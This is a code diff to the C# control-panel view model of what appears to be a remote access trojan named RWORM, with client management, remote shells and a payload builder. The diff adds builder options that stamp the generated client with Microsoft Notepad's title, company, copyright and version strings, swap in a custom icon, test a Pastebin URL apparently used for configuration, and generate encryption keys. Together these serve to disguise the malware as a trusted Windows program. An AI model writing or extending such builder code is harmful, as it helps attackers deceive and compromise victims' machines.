@@ -66,6 +66,19 @@ namespace RWORM.GUI.ViewModels
         private string _buildPastebinRaw = "";
         private string _buildEncryptionKey = "AES-256-DEFAULT";
 
+        // New Builder Assembly / Icon / Pastebin options
+        private bool   _buildPastebinEnabled = false;
+        private bool   _buildAssemblyEnabled = false;
+        private string _buildAssemblyTitle = "Notepad";
+        private string _buildAssemblyDescription = "Notepad";
+        private string _buildAssemblyCompany = "Microsoft Corporation";
+        private string _buildAssemblyProduct = "Microsoft® Windows® Operating System";
+        private string _buildAssemblyCopyright = "© Microsoft Corporation. All rights reserved.";
+        private string _buildAssemblyVersion = "10.0.19041.4522";
+
+        private bool   _buildIconEnabled = false;
+        private string _buildIconPath = "";
+
         public event PropertyChangedEventHandler? PropertyChanged;
 
         public ObservableCollection<ClientModel>  Clients         { get; } = new();
@@ -118,6 +131,18 @@ namespace RWORM.GUI.ViewModels
         public string BuildPastebinRaw      { get => _buildPastebinRaw;      set { _buildPastebinRaw      = value; OnPropertyChanged(); } }
         public string BuildEncryptionKey    { get => _buildEncryptionKey;    set { _buildEncryptionKey    = value; OnPropertyChanged(); } }
 
+        public bool   BuildPastebinEnabled  { get => _buildPastebinEnabled;  set { _buildPastebinEnabled  = value; OnPropertyChanged(); } }
+        public bool   BuildAssemblyEnabled  { get => _buildAssemblyEnabled;  set { _buildAssemblyEnabled  = value; OnPropertyChanged(); } }
+        public string BuildAssemblyTitle    { get => _buildAssemblyTitle;    set { _buildAssemblyTitle    = value; OnPropertyChanged(); } }
+        public string BuildAssemblyDescription { get => _buildAssemblyDescription; set { _buildAssemblyDescription = value; OnPropertyChanged(); } }
+        public string BuildAssemblyCompany  { get => _buildAssemblyCompany;  set { _buildAssemblyCompany  = value; OnPropertyChanged(); } }
+        public string BuildAssemblyProduct  { get => _buildAssemblyProduct;  set { _buildAssemblyProduct  = value; OnPropertyChanged(); } }
+        public string BuildAssemblyCopyright{ get => _buildAssemblyCopyright;set { _buildAssemblyCopyright= value; OnPropertyChanged(); } }
+        public string BuildAssemblyVersion  { get => _buildAssemblyVersion;  set { _buildAssemblyVersion  = value; OnPropertyChanged(); } }
+
+        public bool   BuildIconEnabled      { get => _buildIconEnabled;      set { _buildIconEnabled      = value; OnPropertyChanged(); } }
+        public string BuildIconPath         { get => _buildIconPath;         set { _buildIconPath         = value; OnPropertyChanged(); } }
+
         // ── Commands ──────────────────────────────────────────────────────────
         public ICommand ConnectCommand         { get; }
         public ICommand DisconnectCommand      { get; }
@@ -128,6 +153,10 @@ namespace RWORM.GUI.ViewModels
         public ICommand StopListenerCommand    { get; }
         public ICommand BuildCommand           { get; }
         public ICommand OpenBuilderCommand     { get; }
+        public ICommand GenerateKeyCommand     { get; }
+        public ICommand TestPastebinCommand    { get; }
+        public ICommand CloneAssemblyCommand   { get; }
+        public ICommand SelectIconCommand      { get; }
 
         // Client context commands — all accept ClientModel parameter
         public ICommand OpenShellCommand          { get; }
@@ -187,6 +216,10 @@ namespace RWORM.GUI.ViewModels
                 }
             });
             OpenBuilderCommand    = new RelayCommand(_ => OpenBuilderWindow());
+            GenerateKeyCommand    = new RelayCommand(_ => BuildEncryptionKey = BuilderHelper.GenerateRandomEncryptionKey());
+            TestPastebinCommand   = new RelayCommand(async _ => await BuilderHelper.TestPastebinUrlAsync(BuildPastebinRaw));
+            CloneAssemblyCommand  = new RelayCommand(_ => BuilderHelper.CloneAssemblyFromFile(this));
+            SelectIconCommand     = new RelayCommand(_ => BuilderHelper.SelectIconFile(this));
             SendCommandCommand    = new RelayCommand(async _ => await SendCommandAsync(), _ => IsConnected && SelectedClient != null);
             RefreshClientsCommand = new RelayCommand(async _ => await RefreshClientsAsync(), _ => IsConnected);
             StartListenerCommand  = new RelayCommand(_ => StartListener(), _ => !ListenerRunning);
@@ -1136,6 +1169,63 @@ namespace RWORM.GUI.ViewModels
 
                 System.IO.File.WriteAllText(clientConfigPath, cfg);
 
+                // Configure Client .csproj with optional Assembly and Icon metadata
+                var clientCsprojPath = System.IO.Path.Combine(baseDir, "Client", "RWORM.Client.csproj");
+                var originalCsproj = System.IO.File.ReadAllText(clientCsprojPath);
+                string tempIconDest = null;
+
+                try
+                {
+                    var customProps = new System.Text.StringBuilder();
+
+                    if (BuildIconEnabled && !string.IsNullOrWhiteSpace(BuildIconPath) && System.IO.File.Exists(BuildIconPath))
+                    {
+                        var iconExt = System.IO.Path.GetExtension(BuildIconPath);
+                        tempIconDest = System.IO.Path.Combine(baseDir, "Client", "custom_build_icon" + iconExt);
+                        System.IO.File.Copy(BuildIconPath, tempIconDest, true);
+                        customProps.AppendLine($"    <ApplicationIcon>custom_build_icon{iconExt}</ApplicationIcon>");
+                    }
+
+                    if (BuildAssemblyEnabled)
+                    {
+                        if (!string.IsNullOrWhiteSpace(BuildAssemblyTitle))
+                            customProps.AppendLine($"    <AssemblyTitle>{BuildAssemblyTitle}</AssemblyTitle>");
+                        if (!string.IsNullOrWhiteSpace(BuildAssemblyDescription))
+                        {
+                            customProps.AppendLine($"    <AssemblyDescription>{BuildAssemblyDescription}</AssemblyDescription>");
+                            customProps.AppendLine($"    <Description>{BuildAssemblyDescription}</Description>");
+                        }
+                        if (!string.IsNullOrWhiteSpace(BuildAssemblyCompany))
+                        {
+                            customProps.AppendLine($"    <AssemblyCompany>{BuildAssemblyCompany}</AssemblyCompany>");
+                            customProps.AppendLine($"    <Company>{BuildAssemblyCompany}</Company>");
+                        }
+                        if (!string.IsNullOrWhiteSpace(BuildAssemblyProduct))
+                        {
+                            customProps.AppendLine($"    <AssemblyProduct>{BuildAssemblyProduct}</AssemblyProduct>");
+                            customProps.AppendLine($"    <Product>{BuildAssemblyProduct}</Product>");
+                        }
+                        if (!string.IsNullOrWhiteSpace(BuildAssemblyCopyright))
+                        {
+                            customProps.AppendLine($"    <AssemblyCopyright>{BuildAssemblyCopyright}</AssemblyCopyright>");
+                            customProps.AppendLine($"    <Copyright>{BuildAssemblyCopyright}</Copyright>");
+                        }
+                        if (!string.IsNullOrWhiteSpace(BuildAssemblyVersion))
+                        {
+                            customProps.AppendLine($"    <AssemblyVersion>{BuildAssemblyVersion}</AssemblyVersion>");
+                            customProps.AppendLine($"    <AssemblyFileVersion>{BuildAssemblyVersion}</AssemblyFileVersion>");
+                            customProps.AppendLine($"    <FileVersion>{BuildAssemblyVersion}</FileVersion>");
+                        }
+                    }
+
+                    if (customProps.Length > 0)
+                    {
+                        var updatedCsproj = originalCsproj.Replace("</PropertyGroup>", customProps.ToString() + "  </PropertyGroup>");
+                        System.IO.File.WriteAllText(clientCsprojPath, updatedCsproj);
+                    }
+                }
+                catch { }
+
                 var clientPath  = System.IO.Path.Combine(baseDir, "Client");
                 var tempOutput  = System.IO.Path.Combine(baseDir, "output");
                 System.IO.Directory.CreateDirectory(tempOutput);
@@ -1176,6 +1266,14 @@ namespace RWORM.GUI.ViewModels
                 }
 
                 try { System.IO.Directory.Delete(tempOutput, true); } catch { }
+                try
+                {
+                    if (originalCsproj != null && clientCsprojPath != null)
+                        System.IO.File.WriteAllText(clientCsprojPath, originalCsproj);
+                    if (tempIconDest != null && System.IO.File.Exists(tempIconDest))
+                        System.IO.File.Delete(tempIconDest);
+                }
+                catch { }
             }
             catch (Exception ex)
             {
